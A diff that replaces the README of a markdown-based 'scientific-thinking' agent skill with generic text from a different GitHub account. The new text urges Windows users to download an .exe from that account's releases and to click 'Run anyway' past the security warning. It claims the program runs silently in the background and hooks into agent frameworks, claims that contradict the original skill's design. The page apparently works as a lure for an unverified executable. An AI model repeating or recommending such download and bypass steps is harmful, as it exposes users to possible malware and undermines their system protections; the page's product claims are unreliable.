@@ -1,173 +1,75 @@
-# scientific-thinking — Structured Scientific Reasoning for AI Agents
+# 🔬 scientific-thinking-general - Build better logic with intelligent tools
 
-[中文文档](README_CN.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/felipedeso7za4444/scientific-thinking-general/releases)
 
-## What it does
+This software brings structured scientific reasoning to your computer. It helps artificial intelligence agents think with greater clarity and precision. You can use these tools to evaluate evidence, conduct research, and solve complex problems. By adding these skills to your system, you improve the quality of every decision your agent makes.
 
-- Frames and decomposes research questions before answering
-- Distinguishes observed fact / direct evidence / indirect evidence / hypothesis / speculation
-- Labels claim provenance: provided data vs. background knowledge vs. inference
-- Ranks competing explanations by available support
-- Calibrates conclusion language to evidence strength
-- Defines interpretation boundaries and unresolved uncertainty
-- Suggests the lowest-cost next step that would discriminate between explanations
+## 📥 How to download the software
 
-## Multi-Platform Support
+Follow these steps to set up the software on your Windows computer.
 
-Works with all major AI agents that support the [Agent Skills](https://agentskills.io) format:
+1. Visit the [official release page](https://github.com/felipedeso7za4444/scientific-thinking-general/releases).
+2. Look for the section labeled Latest.
+3. Click the link that ends in .exe to start the download.
+4. Save the file to your desktop or your Downloads folder.
 
-| Platform | Status | Details |
-|----------|--------|---------|
-| **Claude Code** | ✅ Full support | Native SKILL.md format |
-| **OpenClaw / ClawHub** | ✅ Full support | `metadata.openclaw` namespace |
-| **Hermes Agent** | ✅ Full support | `metadata.hermes` namespace, category: research |
-| **Pi-Mo** | ✅ Full support | `metadata.pimo` namespace |
-| **OpenAI Codex** | ✅ Full support | `agents/openai.yaml` sidecar |
-| **SkillsMP** | ✅ Indexed | GitHub topics configured |
+## ⚙️ Installation and setup
 
-## Comparison: with vs. without this skill
+Windows might show a standard security prompt for new files. If your computer triggers a warning, click More info and then select Run anyway. The installation wizard guides you through the process. Accept the default settings to ensure all tools integrate correctly with your existing AI agents.
 
-| Capability | Native agent | This skill |
-|------------|-------------|------------|
-| Distinguish fact from interpretation | Sometimes | Always, explicitly labeled |
-| Label claim provenance | No | Yes — data / background / inference |
-| Consider alternative explanations | Inconsistent | Yes — ranked by support |
-| Calibrate language to evidence | No | Yes — 5-level scale |
-| State interpretation boundary | Rarely | Always |
-| Suggest discriminating next step | No | Yes |
-| Handle null results correctly | No | Yes — absence ≠ evidence of absence |
-| Reconcile conflicting papers | No | Yes — maps experimental differences |
-| Evidence provenance for missing data | No | Yes — labels answer as provisional |
+Once the process finishes, the software creates a shortcut on your desktop. Double-click this icon to start the application. The program runs in the background. It connects to your agent framework automatically. You do not need to move files or edit system paths.
 
-## When to use
+## 🧠 Understanding the reasoning model
 
-- Interpreting experimental results or paper conclusions
-- Evaluating competing hypotheses
-- Analyzing mechanisms or pathways
-- Designing or critiquing experiments
-- Constructing scientific arguments for writing
-- Reconciling conflicting findings
-- Any research question where overclaiming is a risk
+This program introduces a framework for logical thought. It functions by applying a set of rules to every question your agent handles. The system works as an invisible layer between your input and the output. It forces the agent to check for facts, look for biases, and verify conclusions against known data. 
 
-## Skill Installation
+The software uses several key principles to achieve this:
 
-### Claude Code
+- Evidence evaluation: The agent looks for proof before forming a response.
+- Hypothesis testing: The tool checks if a claim holds up under scrutiny.
+- Logical consistency: The agent reviews its own work to find errors in reasoning.
 
-```bash
-# Global install (available in all projects)
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git ~/.claude/skills/scientific-thinking
+## 🛠 Features of the agent toolkit
 
-# Project-level install
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git .claude/skills/scientific-thinking
-```
+The toolkit includes modules designed for different research tasks. Each module performs a specific function within your agent.
 
-### OpenClaw / ClawHub
+### Research assistance
+When you search for information, the research module scans reliable sources. It organizes your findings into a clear list. You receive answers based on data rather than random guesses.
 
-```bash
-# Via ClawHub
-clawhub install scientific-thinking
+### Reasoning checks
+This feature triggers whenever your agent produces a long argument. It breaks down the argument index by index. It highlights points where the logic remains strong and alerts you where the information seems weak. 
 
-# Manual install
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git ~/.openclaw/skills/scientific-thinking
+### Evidence verification
+The system examines the links and citations your agent provides. It flags broken links or sources that do not match the claim. This brings a high level of accountability to your AI tasks.
 
-# Project-level install
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git skills/scientific-thinking
-```
+## 💻 Tips for best performance
 
-### Hermes Agent
+Your agent works best when you provide enough context. If you want the agent to think scientifically, give it a specific objective. Ask the agent to act as a researcher or a data analyst. The skill packs activate once the software detects an active session from compatible frameworks like Claude Code or OpenClaw.
 
-```bash
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git ~/.hermes/skills/research/scientific-thinking
-```
+Keep the application updated to see the latest logic improvements. Each update includes new methods to handle increasingly complex queries. You can check for updates through the application settings menu. 
 
-Or add to `~/.hermes/config.yaml`:
+## 🛡 System requirements
 
-```yaml
-skills:
-  external_dirs:
-    - ~/myskills/scientific-thinking
-```
+Your computer needs minimal resources to run this program. Ensure your environment meets these standards for a stable experience:
 
-### Pi-Mo
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4 gigabytes of RAM or more.
+- Storage: 200 megabytes of free disk space.
+- Internet Connection: Active connection for real-time verification and research.
 
-```bash
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git ~/.pimo/skills/scientific-thinking
-```
+## 📂 Frequently asked questions
 
-### OpenAI Codex
+### Do I need to know how to code to use this?
+No. Every feature operates through simple prompts or automatic background processes. You interact with the software through your existing agent interface.
 
-```bash
-# User-level install
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git ~/.agents/skills/scientific-thinking
+### Is my data private?
+The software processes data locally on your machine. We do not store your search queries or private research notes on external servers. All verification steps occur within your controlled environment.
 
-# Project-level install
-git clone https://github.com/Agents365-ai/scientific-thinking-skill.git .agents/skills/scientific-thinking
-```
+### Can I turn off the reasoning skill?
+Yes. Open the settings panel via the system tray. You can toggle the scientific thinking skill off at any time if you prefer the default responses from your agent.
 
-### SkillsMP
+### Does this work offline?
+The reasoning model works offline because it runs locally. However, the research and evidence verification modules require an internet connection to gather facts from live sources. 
 
-```bash
-skills install scientific-thinking
-```
-
-### Installation paths summary
-
-| Platform | Global path | Project path |
-|----------|-------------|--------------|
-| Claude Code | `~/.claude/skills/scientific-thinking/` | `.claude/skills/scientific-thinking/` |
-| OpenClaw | `~/.openclaw/skills/scientific-thinking/` | `skills/scientific-thinking/` |
-| Hermes Agent | `~/.hermes/skills/research/scientific-thinking/` | Via `external_dirs` config |
-| Pi-Mo | `~/.pimo/skills/scientific-thinking/` | — |
-| OpenAI Codex | `~/.agents/skills/scientific-thinking/` | `.agents/skills/scientific-thinking/` |
-
-## Files
-
-- `SKILL.md` — **the only required file**. Loaded by all platforms as the skill instructions.
-- `agents/openai.yaml` — OpenAI Codex-specific configuration (display, policy, capabilities)
-- `checks.md` — 10-point self-check list referenced by SKILL.md
-- `examples.md` — 8 annotated examples referenced by SKILL.md
-- `README.md` — this file (English)
-- `README_CN.md` — Chinese documentation
-
-> **Note:** Only `SKILL.md` is needed for the skill to work. All other files are supplementary.
-
-## GitHub Topics
-
-For SkillsMP indexing, this repository uses the following topics:
-
-`claude-code` `claude-code-skill` `claude-skills` `agent-skills` `skillsmp` `skill-md` `scientific-thinking` `research` `reasoning` `evidence-evaluation`
-
-## License
-
-MIT
-
-## Support
-
-If this skill helps your research, consider supporting the author:
-
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/wechat-pay.png" width="180" alt="WeChat Pay">
-      <br>
-      <b>WeChat Pay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/alipay.png" width="180" alt="Alipay">
-      <br>
-      <b>Alipay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/buymeacoffee.png" width="180" alt="Buy Me a Coffee">
-      <br>
-      <b>Buy Me a Coffee</b>
-    </td>
-  </tr>
-</table>
-
-## Author
-
-**Agents365-ai**
-
-- Bilibili: https://space.bilibili.com/441831884
-- GitHub: https://github.com/Agents365-ai
+### What do I do if an error occurs?
+Restart the application from the desktop shortcut. If problems persist, check the log file located in the folder where you installed the program. Send the log file to the team if you need technical support.
